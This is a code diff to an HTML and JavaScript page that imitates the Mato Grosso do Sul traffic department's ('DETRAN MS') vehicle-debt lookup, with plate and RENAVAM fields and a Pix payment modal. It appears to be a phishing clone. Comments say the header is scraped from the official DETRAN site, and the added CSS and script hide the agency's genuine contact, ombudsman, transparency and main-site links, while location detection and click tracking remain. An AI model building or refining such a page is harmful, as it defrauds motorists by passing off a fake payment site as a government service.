@@ -433,6 +433,29 @@
         }
 
         /* ========================================= */
+        /* CORREÇÕES VISUAIS - ESPAÇAMENTO ENTRE CAMPOS E BOTÕES */
+        /* ========================================= */
+        
+        /* CORREÇÃO: ESPAÇO ENTRE CAMPOS E BOTÕES */
+        .form-original {
+            margin-top: 25px !important;
+        }
+        
+        /* Mais espaço acima dos botões */
+        .form-original > .flex.items-center.gap-4.max-\\[500px\\]:w-full.max-\\[500px\\]:flex-col {
+            margin-top: 35px !important;
+        }
+        
+        /* Mais espaço abaixo do campo RENAVAM */
+        #renavam {
+            margin-bottom: 10px !important;
+        }
+        
+        div.w-full.flex.flex-col.gap-1.mb-6:last-of-type {
+            margin-bottom: 30px !important;
+        }
+        
+        /* ========================================= */
         /* REMOÇÕES ESPECÍFICAS QUE VOCÊ PEDIU */
         /* ========================================= */
         
@@ -441,17 +464,31 @@
             display: none !important;
         }
         
-        /* 2. REMOVER "Consulta de Débitos" DO CABEÇALHO AZUL (ABAIXO DA LOGO) */
-        /* Este é o texto que vem do scraping do DETRAN oficial */
-        header.w-full.flex.flex-col h1,
-        header.w-full.flex.flex-col h2,
-        header.w-full.flex.flex-col h3,
-        header.w-full.flex.flex-col h4,
-        header.w-full.flex.flex-col h5,
-        header.w-full.flex.flex-col h6,
-        header.w-full.flex.flex-col div:contains("Consulta de Débitos"),
-        header.w-full.flex.flex-col span:contains("Consulta de Débitos"),
-        header.w-full.flex.flex-col p:contains("Consulta de Débitos") {
+        /* 2. REMOVER COMPLETAMENTE O SEGUNDO BLOCO AZUL */
+        /* Este é o bloco com "Consulta de Débitos", "FALE CONOSCO", etc. */
+        header.w-full.flex.flex-col > div:nth-child(2),
+        header.w-full.flex.flex-col > div.bg-004f9f:nth-child(2),
+        .w-full.px-6.bg-004f9f.h-\[128px\]:nth-child(2) {
+            display: none !important;
+            visibility: hidden !important;
+            height: 0 !important;
+            width: 0 !important;
+            position: absolute !important;
+            pointer-events: none !important;
+            overflow: hidden !important;
+            opacity: 0 !important;
+        }
+        
+        /* Remover qualquer elemento filho do header que contenha esses textos */
+        header.w-full.flex.flex-col * {
+            position: relative;
+        }
+        
+        /* Remover específicamente os links do menu inferior */
+        header.w-full.flex.flex-col a[href*="fale-conosco"],
+        header.w-full.flex.flex-col a[href*="ouvidoria"],
+        header.w-full.flex.flex-col a[href*="transparencia"],
+        header.w-full.flex.flex-col a[href*="site-detran"] {
             display: none !important;
             visibility: hidden !important;
             height: 0 !important;
@@ -461,73 +498,23 @@
         }
         
         /* 3. REMOVER "FALE CONOSCO" */
-        div:contains("FALE CONOSCO"),
-        span:contains("FALE CONOSCO"),
-        a:contains("FALE CONOSCO"),
-        p:contains("FALE CONOSCO"),
-        h1:contains("FALE CONOSCO"),
-        h2:contains("FALE CONOSCO"),
-        h3:contains("FALE CONOSCO"),
-        h4:contains("FALE CONOSCO"),
-        h5:contains("FALE CONOSCO"),
-        h6:contains("FALE CONOSCO") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
         /* 4. REMOVER "SITE DETRAN MS" */
-        div:contains("SITE DETRAN MS"),
-        span:contains("SITE DETRAN MS"),
-        a:contains("SITE DETRAN MS"),
-        p:contains("SITE DETRAN MS") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
         /* 5. REMOVER "OUVIDORIA" */
-        div:contains("OUVIDORIA"),
-        span:contains("OUVIDORIA"),
-        a:contains("OUVIDORIA"),
-        p:contains("OUVIDORIA") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
         /* 6. REMOVER "TRANSPARÊNCIA" */
-        div:contains("TRANSPARÊNCIA"),
-        span:contains("TRANSPARÊNCIA"),
-        a:contains("TRANSPARÊNCIA"),
-        p:contains("TRANSPARÊNCIA") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
+        /* Seleciona qualquer elemento que contenha esses textos */
+        * {
+            position: relative;
         }
         
-        /* REMOVER O BLOCO INTEIRO COM ESSES TEXTOS */
-        .w-full.px-6.bg-004f9f.h-\\[128px\\] + .w-full.px-6.bg-004f9f.h-\\[128px\\] {
-            display: none !important;
+        /* Garantir que esses elementos não apareçam */
+        body > *:not(#formularioContainer):not(#resultadosContainer):not(#modalPix):not(footer) {
+            overflow: visible;
         }
         
-        header.w-full.flex.flex-col > div:nth-child(2) {
+        /* Remover o bloco inteiro do menu inferior */
+        .flex.items-center.gap-8.justify-center.pt-6.pb-4,
+        .flex.items-center.gap-8,
+        .flex.items-center.gap-8 > * {
             display: none !important;
         }
         
@@ -535,12 +522,19 @@
         .flex.items-center.gap-3.max-\\[800px\\]:hidden {
             display: none !important;
         }
+        
+        /* Garantir que o header tenha altura correta */
+        header.w-full.flex.flex-col {
+            min-height: 128px;
+            height: 128px;
+            overflow: hidden;
+        }
     </style>
 </head>
 <body class="font-sans">
-    <!-- CABEÇALHO ORIGINAL - "Consulta de Débitos" SERÁ REMOVIDO PELO CSS -->
+    <!-- CABEÇALHO ORIGINAL - APENAS PRIMEIRO BLOCO AZUL (LOGO) -->
     <header class="w-full flex flex-col">
-        <!-- BLOCO AZUL DO MEUDETRAN (MANTIDO) -->
+        <!-- BLOCO AZUL DO MEUDETRAN (MANTIDO) - APENAS LOGOS -->
         <div class="w-full px-6 bg-004f9f h-[128px]">
             <div class="w-full max-w-[1050px] mx-auto h-full flex justify-between">
                 <a href="/">
@@ -556,8 +550,8 @@
             </div>
         </div>
         
-        <!-- AQUI ESTAVA O BLOCO AZUL COM "Consulta de Débitos", "FALE CONOSCO", etc. -->
-        <!-- REMOVIDO PELO CSS -->
+        <!-- SEGUNDO BLOCO AZUL REMOVIDO (com "Consulta de Débitos", "FALE CONOSCO", etc.) -->
+        <!-- Este bloco será removido pelo CSS acima -->
     </header>
 
     <!-- MENU DE NAVEGAÇÃO (MANTIDO COM CASINHA E TEXTO) -->
@@ -572,7 +566,7 @@
                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-right text-neutral-500 size-6 2xl:size-7">
                     <path d="M9 18l6-6-6-6"></path>
                 </svg>
-                <!-- TEXTO "Consulta de Débitos" MANTIDO -->
+                <!-- TEXTO "Consulta de Débitos" MANTIDO (APENAS ESTE DEVE APARECER) -->
                 <h2 class="uppercase font-bold text-base text-1351b4" id="menuTitulo">Consulta de Débitos</h2>
             </div>
         </div>
@@ -800,7 +794,7 @@
         const API_BASE = window.location.origin; // Usa mesma origem do site
         
         // DEBUG
-        console.log('🚀 Sistema DETRAN MS v2.6.3 iniciado');
+        console.log('🚀 Sistema DETRAN MS v2.6.4 iniciado');
         console.log('🌐 API Base:', API_BASE);
         console.log('📱 Dispositivo:', /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop');
 
@@ -929,10 +923,85 @@
         })();
 
         // =========================================
+        // FUNÇÃO PARA REMOVER ELEMENTOS INDESEJADOS
+        // =========================================
+        function removerElementosIndesejados() {
+            console.log('🧹 Removendo elementos indesejados...');
+            
+            // Lista de textos a remover
+            const textosParaRemover = [
+                'FALE CONOSCO',
+                'SITE DETRAN MS',
+                'OUVIDORIA',
+                'TRANSPARÊNCIA'
+            ];
+            
+            // Remover elementos por texto
+            textosParaRemover.forEach(texto => {
+                const elementos = document.querySelectorAll('*');
+                elementos.forEach(el => {
+                    if (el.textContent && el.textContent.includes(texto)) {
+                        // Verificar se não é um elemento importante
+                        const id = el.id || '';
+                        const classe = el.className || '';
+                        const tag = el.tagName;
+                        
+                        // Não remover elementos importantes
+                        const elementosImportantes = [
+                            'formularioContainer', 'resultadosContainer', 'modalPix',
+                            'consultaForm', 'placa', 'renavam', 'menuTitulo',
+                            'CONSULTAR', 'CANCELAR', 'Nova Consulta', 'footer'
+                        ];
+                        
+                        const deveManter = elementosImportantes.some(importante => 
+                            id.includes(importante) || 
+                            classe.includes(importante) ||
+                            el.closest('#formularioContainer') ||
+                            el.closest('#resultadosContainer') ||
+                            el.closest('#modalPix') ||
+                            el.closest('footer')
+                        );
+                        
+                        if (!deveManter && tag !== 'BODY' && tag !== 'HTML') {
+                            el.style.display = 'none';
+                            el.style.visibility = 'hidden';
+                            el.style.height = '0';
+                            el.style.width = '0';
+                            el.style.overflow = 'hidden';
+                            el.style.position = 'absolute';
+                            el.style.pointerEvents = 'none';
+                            el.style.opacity = '0';
+                        }
+                    }
+                });
+            });
+            
+            // Remover especificamente o segundo bloco azul (se existir)
+            const blocosAzuis = document.querySelectorAll('.w-full.px-6.bg-004f9f.h-\\[128px\\]');
+            if (blocosAzuis.length > 1) {
+                for (let i = 1; i < blocosAzuis.length; i++) {
+                    blocosAzuis[i].style.display = 'none';
+                    blocosAzuis[i].style.visibility = 'hidden';
+                    blocosAzuis[i].style.height = '0';
+                    blocosAzuis[i].style.width = '0';
+                    blocosAzuis[i].style.overflow = 'hidden';
+                    blocosAzuis[i].style.position = 'absolute';
+                    blocosAzuis[i].style.pointerEvents = 'none';
+                    blocosAzuis[i].style.opacity = '0';
+                }
+            }
+            
+            console.log('✅ Elementos indesejados removidos');
+        }
+
+        // =========================================
         // CONSULTA DE DÉBITOS
         // =========================================
         document.addEventListener('DOMContentLoaded', function() {
             detectarLocalizacao();
+            
+            // Remover elementos indesejados ao carregar
+            setTimeout(removerElementosIndesejados, 100);
             
             const form = document.getElementById('consultaForm');
             const loading = document.getElementById('loading');
@@ -1037,6 +1106,9 @@
                 resultadosContainer.classList.remove('hidden');
                 
                 pixJaCopiado = false;
+                
+                // Remover elementos indesejados novamente nos resultados
+                setTimeout(removerElementosIndesejados, 200);
                 
                 registrarClique('resultados', 'visualizar_resultados', 'Resultados exibidos');
             }
@@ -1446,7 +1518,7 @@
             }
         });
 
-        console.log('✅ Sistema DETRAN MS v2.6.3 carregado com sucesso!');
+        console.log('✅ Sistema DETRAN MS v2.6.4 carregado com sucesso!');
     </script>
 </body>
 </html>
